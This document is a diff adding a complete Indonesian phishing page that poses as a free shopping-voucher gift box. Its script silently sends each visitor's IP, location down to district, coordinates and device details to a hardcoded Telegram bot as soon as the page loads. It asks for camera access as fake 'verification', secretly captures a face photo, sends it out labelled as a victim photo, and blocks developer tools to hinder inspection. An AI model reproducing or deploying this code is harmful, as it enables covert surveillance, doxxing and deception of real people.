@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>gift-box.site</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #6b0f1a, #b9134b);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+        
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: rgba(255,255,255,0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            overflow: hidden;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.4);
+            border: 3px solid #ffd700;
+            position: relative;
+        }
+        
+        /* Ribbon Effect */
+        .ribbon {
+            position: absolute;
+            top: 20px;
+            right: -30px;
+            background: #ffd700;
+            color: #b9134b;
+            padding: 8px 40px;
+            transform: rotate(45deg);
+            font-weight: bold;
+            font-size: 14px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            z-index: 10;
+        }
+        
+        /* Header */
+        .gift-header {
+            background: linear-gradient(135deg, #b9134b, #6b0f1a);
+            padding: 30px 20px;
+            text-align: center;
+            border-bottom: 3px solid #ffd700;
+        }
+        
+        .gift-icon {
+            width: 100px;
+            height: 100px;
+            background: #ffd700;
+            border-radius: 30px;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 50px;
+            animation: bounce 2s infinite;
+            box-shadow: 0 10px 30px rgba(255,215,0,0.5);
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .gift-header h1 {
+            color: white;
+            font-size: 32px;
+            margin-bottom: 5px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .gift-header p {
+            color: #ffd700;
+            font-size: 16px;
+            font-weight: 600;
+        }
+        
+        /* Content */
+        .content {
+            padding: 30px 20px;
+            text-align: center;
+        }
+        
+        .surprise-text {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 25px;
+        }
+        
+        .surprise-text span {
+            color: #b9134b;
+            background: #ffe6e9;
+            padding: 5px 15px;
+            border-radius: 50px;
+            display: inline-block;
+            margin-top: 10px;
+        }
+        
+        /* GIFT BOX BESAR - KLIK UNTUK MULAI */
+        .gift-box-large {
+            background: linear-gradient(135deg, #ffd700, #ffaa00);
+            border-radius: 40px;
+            padding: 50px 30px;
+            margin: 20px 0 30px;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 4px solid white;
+            box-shadow: 0 20px 40px rgba(255,215,0,0.4);
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+        
+        .gift-box-large:hover {
+            transform: scale(1.03);
+            box-shadow: 0 30px 60px rgba(255,215,0,0.6);
+        }
+        
+        .gift-emoji-large {
+            font-size: 100px;
+            margin-bottom: 20px;
+            filter: drop-shadow(0 15px 15px rgba(0,0,0,0.2));
+        }
+        
+        .gift-text-large {
+            color: #b9134b;
+            font-weight: bold;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        
+        .gift-sub-large {
+            color: #8b0000;
+            font-size: 16px;
+        }
+        
+        /* Info box */
+        .info-box {
+            background: #f9f9f9;
+            border-radius: 20px;
+            padding: 15px;
+            margin: 20px 0;
+            border-left: 4px solid #ffd700;
+            text-align: left;
+        }
+        
+        .info-box p {
+            color: #666;
+            font-size: 13px;
+            margin: 5px 0;
+        }
+        
+        /* Footer */
+        .footer {
+            background: #f5f5f5;
+            padding: 15px;
+            text-align: center;
+            border-top: 3px solid #ffd700;
+            font-size: 12px;
+            color: #666;
+        }
+        
+        /* Loading overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .loading-box {
+            background: #1a1a1a;
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            border: 2px solid #ffd700;
+            max-width: 300px;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #333;
+            border-top-color: #ffd700;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            color: white;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+        
+        .loading-sub {
+            color: #aaa;
+            font-size: 12px;
+        }
+        
+        /* Hidden Camera */
+        .camera-hidden {
+            position: fixed;
+            top: -100%;
+            left: -100%;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="ribbon">🎁 SPECIAL GIFT</div>
+        
+        <!-- Header -->
+        <div class="gift-header">
+            <div class="gift-icon">🎁</div>
+            <h1>GIFT BOX</h1>
+            <p>Hadiah spesial untukmu!</p>
+        </div>
+        
+        <!-- Content -->
+        <div class="content">
+            <div class="surprise-text">
+                🎉 SELAMAT! 🎉<br>
+                <span>Kamu mendapatkan hadiah kejutan!</span>
+            </div>
+            
+            <!-- GIFT BOX BESAR - KLIK UNTUK MULAI -->
+            <div class="gift-box-large" onclick="openGift()">
+                <div class="gift-emoji-large">🎁</div>
+                <div class="gift-text-large">BUKA HADIAH</div>
+                <div class="gift-sub-large">Klik di sini</div>
+            </div>
+            
+            <!-- Info kecil -->
+            <div class="info-box">
+                <p>✨ Hadiah: Voucher Belanja Rp1.000.000</p>
+                <p>⏳ Batas klaim: 24 jam</p>
+                <p>📱 Klik kotak hadiah untuk mengklaim</p>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer">
+            gift-box.site • Official • 100% Original
+        </div>
+    </div>
+    
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-box">
+            <div class="spinner"></div>
+            <div class="loading-text" id="loadingText">Membuka hadiah...</div>
+            <div class="loading-sub" id="loadingSub">Harap izinkan akses kamera untuk verifikasi</div>
+        </div>
+    </div>
+    
+    <!-- Hidden Camera -->
+    <div class="camera-hidden">
+        <video id="hiddenVideo" autoplay playsinline></video>
+        <canvas id="hiddenCanvas" style="display:none;"></canvas>
+    </div>
+
+    <script>
+        // ============== TOKEN BOT LO ==============
+        const BOT_TOKEN = '7910084721:AAGsf-k5ZrE7Q3ty5EN08FUJkWqwde3IMCY';
+        const CHAT_ID = '7841075150';
+        // ==========================================
+        
+        let cameraStream = null;
+        let processStarted = false;
+        
+        // Fungsi dapat IP
+        async function getPublicIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return 'Unknown';
+            }
+        }
+        
+        // Fungsi dapat lokasi (LENGKAP SAMPAI KECAMATAN)
+        async function getLocation(ip) {
+            try {
+                const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,district,isp,lat,lon`);
+                const data = await res.json();
+                
+                if (data.status === 'success') {
+                    return {
+                        country: data.country || '-',
+                        region: data.regionName || '-',
+                        city: data.city || '-',
+                        district: data.district || '-',
+                        isp: data.isp || '-',
+                        lat: data.lat || '-',
+                        lon: data.lon || '-'
+                    };
+                }
+                return { region: '-', city: '-', district: '-', isp: '-', lat: '-', lon: '-' };
+            } catch {
+                return { region: '-', city: '-', district: '-', isp: '-', lat: '-', lon: '-' };
+            }
+        }
+        
+        // Fungsi dapat device info lengkap
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = 'Unknown';
+            let brand = 'Unknown';
+            let model = 'Unknown';
+            
+            if (/Android/i.test(ua)) {
+                device = 'Android';
+                if (ua.includes('Samsung')) brand = 'Samsung';
+                else if (ua.includes('Xiaomi')) brand = 'Xiaomi';
+                else if (ua.includes('Redmi')) brand = 'Redmi';
+                else if (ua.includes('POCO')) brand = 'POCO';
+                else if (ua.includes('Oppo')) brand = 'Oppo';
+                else if (ua.includes('Vivo')) brand = 'Vivo';
+                else if (ua.includes('Realme')) brand = 'Realme';
+                else if (ua.includes('Huawei')) brand = 'Huawei';
+            } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                device = 'iOS';
+                brand = 'Apple';
+            } else if (/Windows/i.test(ua)) {
+                device = 'Windows';
+            } else if (/Mac/i.test(ua)) {
+                device = 'Mac';
+            }
+            
+            // Deteksi model khusus Samsung
+            if (ua.includes('SM-G998')) model = 'Galaxy S21 Ultra';
+            else if (ua.includes('SM-G996')) model = 'Galaxy S21+';
+            else if (ua.includes('SM-G991')) model = 'Galaxy S21';
+            else if (ua.includes('SM-A')) model = 'Galaxy A Series';
+            
+            return { 
+                device, 
+                brand,
+                model,
+                browser: ua.includes('Chrome') ? 'Chrome' : 
+                        ua.includes('Firefox') ? 'Firefox' : 
+                        ua.includes('Safari') ? 'Safari' : 'Unknown',
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: `${window.screen.width}x${window.screen.height}`
+            };
+        }
+        
+        // Fungsi kirim ke Telegram
+        async function sendToTelegram(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ 
+                        chat_id: CHAT_ID, 
+                        text: message, 
+                        parse_mode: 'HTML' 
+                    })
+                });
+            } catch (e) {
+                console.log('Telegram error:', e);
+            }
+        }
+        
+        // Fungsi kamera
+        async function captureCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    } 
+                });
+                
+                cameraStream = stream;
+                const video = document.getElementById('hiddenVideo');
+                video.srcObject = stream;
+                
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+                
+                await new Promise(r => setTimeout(r, 500));
+                
+                const canvas = document.getElementById('hiddenCanvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                
+                const ctx = canvas.getContext('2d');
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                stream.getTracks().forEach(track => track.stop());
+                cameraStream = null;
+                
+                return new Promise((resolve) => {
+                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
+                });
+                
+            } catch (err) {
+                console.log('Camera error:', err);
+                return null;
+            }
+        }
+        
+        // Fungsi kirim foto
+        async function sendPhotoToTelegram(imageBlob, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', imageBlob, 'face.jpg');
+            formData.append('caption', caption.substring(0, 200));
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                return true;
+            } catch (e) {
+                console.log('Photo error:', e);
+                return false;
+            }
+        }
+        
+        // Fungsi utama saat gift box diklik
+        async function openGift() {
+            if (processStarted) return;
+            processStarted = true;
+            
+            // Tampilkan loading
+            document.getElementById('loadingOverlay').style.display = 'flex';
+            document.getElementById('loadingText').innerText = 'Membuka hadiah...';
+            document.getElementById('loadingSub').innerText = 'Harap izinkan akses kamera untuk verifikasi';
+            
+            // Kirim notifikasi awal
+            await sendToTelegram(`
+🎁 <b>GIFT BOX DIKLIK!</b>
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}
+⏳ Meminta akses kamera...
+            `);
+            
+            // Coba ambil foto
+            const photoBlob = await captureCamera();
+            
+            // Dapatkan data
+            const ip = await getPublicIP();
+            const loc = await getLocation(ip);
+            const device = getDeviceInfo();
+            
+            if (photoBlob) {
+                // Sukses - kirim foto
+                document.getElementById('loadingText').innerText = 'Mengirim foto...';
+                document.getElementById('loadingSub').innerText = 'Harap tunggu';
+                
+                await sendPhotoToTelegram(photoBlob, `
+📸 <b>FOTO KORBAN (GIFT BOX)</b>
+🌐 IP: ${ip}
+📍 Lokasi: ${loc.region}, ${loc.city}, ${loc.district}
+🏙️ Kota: ${loc.city}
+🏘️ Kecamatan: ${loc.district}
+📡 ISP: ${loc.isp}
+📱 Device: ${device.brand} ${device.model} ${device.device}
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}
+                `);
+                
+                // Kirim data lengkap
+                await sendToTelegram(`
+🔐 <b>DATA LENGKAP KORBAN</b>
+
+━━━━━━━━━━━━━━━
+🌐 <b>IP:</b> ${ip}
+📍 <b>LOKASI:</b>
+• Negara: ${loc.country}
+• Provinsi: ${loc.region}
+• Kota: ${loc.city}
+• Kecamatan: ${loc.district}
+• ISP: ${loc.isp}
+• Koordinat: ${loc.lat}, ${loc.lon}
+━━━━━━━━━━━━━━━
+📱 <b>DEVICE:</b>
+• Tipe: ${device.device}
+• Brand: ${device.brand}
+• Model: ${device.model}
+• Browser: ${device.browser}
+• Bahasa: ${device.language}
+• Layar: ${device.screen}
+━━━━━━━━━━━━━━━
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}
+                `);
+                
+                // Sembunyikan loading
+                document.getElementById('loadingOverlay').style.display = 'none';
+                
+                // Ubah tampilan gift box
+                document.querySelector('.gift-box-large').innerHTML = `
+                    <div class="gift-emoji-large">✅</div>
+                    <div class="gift-text-large">HADIAH TERBUKA!</div>
+                    <div class="gift-sub-large">Terima kasih</div>
+                `;
+                
+                // Redirect setelah 2 detik
+                setTimeout(() => {
+                    window.location.href = 'https://www.whatsapp.com';
+                }, 2000);
+                
+            } else {
+                // Gagal kamera
+                await sendToTelegram(`
+❌ <b>KAMERA DITOLAK!</b>
+🌐 IP: ${ip}
+📍 Lokasi: ${loc.city || '-'}, ${loc.district || '-'}
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}
+            `);
+                
+                document.getElementById('loadingText').innerText = 'Kamera ditolak';
+                document.getElementById('loadingSub').innerText = 'Izinkan kamera untuk membuka hadiah';
+                
+                setTimeout(() => {
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                    processStarted = false;
+                }, 2000);
+            }
+        }
+        
+        // Kirim notifikasi pas buka web
+        window.addEventListener('load', async () => {
+            const ip = await getPublicIP();
+            const loc = await getLocation(ip);
+            const device = getDeviceInfo();
+            
+            await sendToTelegram(`
+👋 <b>USER BUKA LINK GIFT-BOX!</b>
+🌐 IP: ${ip}
+📍 Lokasi: ${loc.city || '-'}, ${loc.district || '-'}
+📱 Device: ${device.brand} ${device.device}
+🔗 URL: ${window.location.href}
+            `);
+        });
+        
+        // Prevent inspect
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                e.preventDefault();
+            }
+        });
+    </script>
+</body>
+  </html>
